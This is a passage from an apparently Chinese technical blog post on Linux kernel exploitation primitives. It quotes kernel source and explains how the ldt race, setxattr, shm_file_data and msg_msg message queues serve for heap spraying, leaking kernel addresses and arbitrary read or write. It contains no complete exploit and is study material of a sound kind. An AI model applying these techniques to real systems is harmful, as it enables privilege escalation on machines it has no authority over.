class="keyword">sizeof</span>(ldt));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			ldt.avl = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">		<span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">	old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">	old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">	new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">	error = -ENOMEM;</span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">	<span class="keyword">if</span> (!new_ldt)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (old_ldt)</span><br><span class="line">		<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">	new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">	finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">	 * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">	 * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">	 * them over to the new LDT.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">		 * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">		 * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">			free_ldt_pgtables(mm);</span><br><span class="line">		free_ldt_struct(new_ldt);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	install_ldt(mm, new_ldt);</span><br><span class="line">	unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">	free_ldt_struct(old_ldt);</span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们主要关注</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line">	<span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">	<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure>
<p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p>
<p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p>
<p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p>
<p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p>
<p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>申请obj大小:任意</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:堆占位</strong></p>
<p>观察 setxattr 源码，发现如下调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure>
<p>在 <code>setxattr()</code> 函数中有如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p>
<p>使用时按照以下格式,其中第一个字符串需要是本进程的文件路径,第二个字符串任意</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p><strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p>
<h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p><strong>申请obj大小:32</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:.text泄露</strong></p>
<p>这个结构体主要是用于泄露内核基址的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>大小为<code>0x20</code>,从kmalloc-32中分配</p>
<p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p>
<p>file字段位于内核线性映射区,能够泄露内核堆地址</p>
<p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p>
<h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p>
<p><strong>shmget</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般这样调用,key可以是任意整型,返回一个shmid</p>
<p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p>
<p><strong>shmat</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	<span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">	err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	force_successful_syscall_return();</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在do_shmat中会分配一个shm_file_data结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure>
<h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure>
<p>其中有着这样一条代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure>
<p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p>
<h2 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h2><p><strong>申请obj大小:64-4k</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:是</strong></p>
<p><strong>功能:任意读|任意写|堆喷</strong></p>
<p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p>
<ul>
<li>msgget：创建一个消息队列</li>
<li>msgsnd：向指定消息队列发送消息</li>
<li>msgrcv：从指定消息队列接接收消息</li>
</ul>
<p><strong>msgget</strong></p>
<p>其中msgget用于创建一个消息队列时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> msgflag)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>key:值为函数ftok的返回值或<code>IPC_PRIVATE</code>，若为<code>IPC_PRIVATE</code>则直接创建新的消息队列</li>
<li>msgflag:<code>IPC_CREAT</code>:创建新的消息队列。 <code>IPC_EXCL</code>:与<code>IPC_CREAT</code>一同使用，表示如果要创建的消息队列已经存在，则返回错误。(<code>IPC_EXCL</code>没有什么实质性的意义，但是可以帮我们确定是新建了消息队列而不是返回已经存在的消息队列) <code>IPC_NOWAIT</code>:读写消息队列要求无法满足时，不阻塞。返回值： 调用成功返回队列标识符,否则返回-1. 其中该参数需要配合权限控制符，例如<code>0666|IPC_CREAT</code></li>
</ul>
<p>在内核空间中会创建一个 <code>msg_queue</code> 结构体,其表示一个消息队列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="type">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><strong>msgsnd</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">const</span> <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>msqid:队列标识符</li>
<li>msgp:指向发送的消息,消息的前八个字节必须是msgtyp(值可以自定义),后面跟真正的消息</li>
<li>msgsz:真正的消息长度</li>
<li>msgflg:标志位<ul>
<li>0:消息队列满时,msgsnd阻塞直到消息能够写入消息队列</li>
<li>IPC_NOWAIT:消息队列满时不等待立即返回</li>
<li>IPC_NOERROR:若发送的消息长度大于msgsz,则截断</li>
</ul>
</li>
</ul>
<p>msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，会建立<code>msg_msg</code>结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="type">long</span> m_type;</span><br><span class="line">	<span class="type">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/wjzFeZiDUpxXVKJ.png" alt=""></p>
<p>若是消息队列中只有一个消息则是这样:</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/sD9xtpaHrQ2uneZ.png" alt=""></p>
<p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p>
<p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5IcVxRaFQtg3HCW.png" alt=""></p>
<p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p>
<p><strong>msgrcv</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp,<span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>msgqid:消息队列标识符</li>
<li>msgp:存放消息的结构体,消息类型msgtyp也会放到这里</li>
<li>msgsz:接收消息长度,不包含消息类型</li>
<li>msgtyp:<ul>
<li>0:接收第一个消息</li>
<li>>0:接收消息类型等于msgtyp的第一个函数</li>
<li>&lt;0:返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
</ul>
</li>
<li>msgflg:<ul>
<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink,从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</li>
<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
</ul>
</li>
</ul>
<p><strong>MSG_COPY</strong></p>
